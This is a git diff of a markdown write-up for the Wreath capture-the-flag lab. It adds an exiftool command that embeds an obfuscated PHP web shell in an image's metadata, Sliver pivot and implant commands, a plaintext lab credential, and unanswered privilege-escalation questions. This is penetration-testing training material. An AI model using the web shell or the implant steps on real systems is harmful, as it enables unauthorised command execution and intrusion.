@@ -916,7 +916,9 @@ And thanks again to [Justin's Article](https://redsiege.com/blog/2022/11/introdu
 
 He is now a senior consultant awesome!
 ![](welldeservedsenior.png)
-
+```
+twreath : i<3ruby
+```
 
 And finally!
 ![](FINALLY.png) 
@@ -1031,7 +1033,6 @@ jpg,jpeg,png,gif
 ![](iloverubyandtwreath.png)
 
 
-
 ```bash
 cp /home/kali/.sliver/go/src/image/testdata/video-001.jpeg test-NVM.jpeg.php
 
@@ -1040,6 +1041,9 @@ exiftool -Comment="<?php echo \"Test Payload\"; die(); ?>" test-NVM.jpeg.php
 
 ![](wat.png)
 
+I never got a success message returned on any file. I retested on a fresh network. 
+
+[Official Writeup](https://www.youtube.com/watch?v=VQLeS1uIrVk&list=PLsqUCyw0Jf9sMYXly0uuwfKMu34roGNwk&index=30) states the need to use sshuttle with chisel. 
 ## AV Evasion Notes for the Archive and answers for the Write-up
 
 - In-Memory Evasion 
@@ -1118,10 +1122,37 @@ Password
 ```
 #### Task 40 AV Evasion PHP Payload Obfuscation
 
+```bash
+exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-NVM.jpeg.php
+```
+
+What is the Host Name of the target?  
+```
+
+```
+What is our current username (include the domain in this)?
+```
+
+```
 #### Task 41 AV Evasion Compiling Netcat & Reverse Shell!
+
+What output do you get when running the command: `certutil.exe`?
+```
+
+```
 
 #### Task 42 AV Evasion Enumeration
 
+
+First of all, let's check to see which account the service runs under:  
+`sc qc SERVICE_NAME`. Is the service running as the local system account (Aye/Nay)?
+```
+```
+
+There should be a bunch of results returned here. Read through them, paying particular attention to the `PathName`  column. Notice that one of the paths does not have quotation marks around it. What is the Name (second column from the left) of this service?
+```
+
+```
 #### Task 43 AV Evasion Privilege Escalation
 
 #### Task 44 Exfiltration Exfiltration Techniques & Post Exploitation
@@ -1172,7 +1203,7 @@ pivots
 // Start a tcp pivots on the current session
 // default listener is on 9898
 pivots tcp 
-pivots tcp  --bind 0.0.0.0
+pivots tcp --bind 0.0.0.0
 // Generate an implant that will connect to the pivot listener
 generate --tcp-pivot 192.168.1.1:9898
 ```
@@ -1193,3 +1224,7 @@ rportfwd add --remote 10.10.10.10:22
 /opt/GitTools/Extractor/extractor.sh . ~/Wreath/extractor-Website-git
 separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
 ```
+
+#### Check out:
+
+https://github.com/Nicocha30/ligolo-ng
